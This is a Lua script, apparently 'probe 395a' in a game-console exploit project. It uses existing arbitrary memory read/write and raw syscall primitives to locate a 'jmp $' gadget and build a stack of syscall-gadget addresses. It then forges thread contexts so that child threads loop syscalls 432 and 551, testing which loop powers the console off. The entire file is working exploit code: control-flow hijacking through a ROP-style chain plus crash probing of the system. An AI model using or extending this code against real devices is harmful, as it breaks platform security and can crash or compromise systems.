-- CRASH_CLASS: HIGH
-- PROBE 395a: does a small syscall loop in a child thread survive
--
-- 392a created a child that looped `551 open-by-name` on a name that did not exist
-- and the console powered off. 393a then died before creating any thread, but 394a
-- ran the same setup cleanly afterwards, so the setup is not the cause - the storm is
-- still the only untested variable.
--
-- This is the smallest step that separates the mechanism from the syscall:
--   [A] one child loops `432 thr_self` 4,095 times and parks on `jmp $`;
--   [B] one child loops `551 open-by-name` on a name that does not exist, 4,095
--       times - the call that was running when 392a took the console down.
-- If [A] powers the console off, the loop mechanism itself is the problem. If [A]
-- survives and [B] does not, `551`'s failure path is.

print("=== PROBE 395a: SMALL STORM ===")
print("")

local CRASH_GATES = 0x480
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(x) return uint64(string.format("0x%X", x)) end
local function addr_of(o) return sgn(uint64(o)) end
local function zero(addr, n) for i = 0, n - 4, 4 do pcall(function() memory.write_dword(addr + i, 0) end) end end

local sc_mmap = make_syscall(477)
local sc_thr  = make_syscall(430)
local sc_info = make_syscall(593)
local sc_kill = make_syscall(431)

local gadget = syscall.syscall_address
local info = memory.alloc(0x200)
pcall(function() memory.write_dword(info, 0x160) end)
local rv = -1
pcall(function() rv = sgn(sc_info(uint64(0), uint64(info), uint64(0), uint64(0), uint64(0), uint64(0))) end)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
print(string.format("gadget=0x%X base=0x%X", to_num(gadget), base))

local park = nil
do
    local ok, s = pcall(function() return memory.read_buffer(base, 0x40000) end)
    if ok and type(s) == "string" then
        local i = 1
        while true do
            local a, b = s:byte(i, i + 1)
            if not a then break end
            if a == 0xEB and b == 0xFE then park = base + i - 1 break end
            i = i + 1
        end
    end
end
print(string.format("park=0x%X", park or 0))
if not park or not gadget then print("missing gadget") print("=== 395a DONE ===") return end

local function storm(rax, rdi, label)
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    local size = 0x8000
    local stack = sgn(sc_mmap(uint64(0), u64(size), u64(3), u64(0x1002), u64(0xFFFFFFFF), u64(0)))
    if stack <= 0 then print("  " .. label .. " mmap failed " .. stack) return nil end
    local slots = math.floor(size / 8) - 1
    for i = 0, slots - 1 do pcall(function() memory.write_qword(stack + i * 8, u64(gadget)) end) end
    pcall(function() memory.write_qword(stack + slots * 8, u64(park)) end)
    pcall(function()
        memory.write_qword(ctx + 0x108, u64(CRASH_GATES))
        memory.write_qword(ctx + 0x0d0, u64(0))
        memory.write_qword(ctx + 0x110, u64(0x10000))
        memory.write_qword(ctx + 0x0c0, u64(0x43))
        memory.write_qword(ctx + 0x0e0, u64(gadget))
        memory.write_qword(ctx + 0x0f8, u64(stack + 8))
        memory.write_qword(ctx + 0x100, u64(0x3b))
        memory.write_qword(ctx + 0x048, u64(rdi))
        memory.write_qword(ctx + 0x078, u64(rax))
    end)
    local out = memory.alloc(8)
    pcall(function() memory.write_qword(out, u64(0)) end)
    local ret = -999
    pcall(function() ret = sgn(sc_thr(uint64(ctx), uint64(out), uint64(0), uint64(0), uint64(0), uint64(0))) end)
    local tid = 0
    pcall(function() tid = sgn(memory.read_qword(out)) end)
    print(string.format("  %s rax=%d calls=%d ret=%d tid=0x%X stack=0x%X", label, rax, slots, ret, tid, stack))
    return tid
end

local tb = memory.alloc(8)
pcall(function() memory.write_qword(tb, u64(0)) end)

print("[A] child loops 432 thr_self")
local tidA = storm(432, addr_of(tb), "childA")
local spin = 0
for i = 1, 300000 do spin = spin + i end
print(string.format("[A] survived, spin=%d, thr_self wrote 0x%X", spin, sgn(memory.read_qword(tb))))
if tidA and tidA > 0 and tidA < 0x1000000 then
    local kr = -999
    pcall(function() kr = sgn(sc_kill(u64(tidA), u64(0), u64(0), u64(0), u64(0), u64(0))) end)
    print(string.format("[A] thr_kill(0x%X)=%d", tidA, kr))
end

local name = memory.alloc(0x40)
zero(name, 0x40)
local NAME = "omp395a"
pcall(function() for i = 1, #NAME do memory.write_byte(name + i - 1, NAME:byte(i)) end end)

print("[B] child loops 551 open-by-name on a name that does not exist")
local tidB = storm(551, addr_of(name), "childB")
local spin2 = 0
for i = 1, 300000 do spin2 = spin2 + i end
print(string.format("[B] survived, spin=%d", spin2))
if tidB and tidB > 0 and tidB < 0x1000000 then
    local kr2 = -999
    pcall(function() kr2 = sgn(sc_kill(u64(tidB), u64(0), u64(0), u64(0), u64(0), u64(0))) end)
    print(string.format("[B] thr_kill(0x%X)=%d", tidB, kr2))
end

print("still alive")
print("")
print("=== 395a DONE ===")
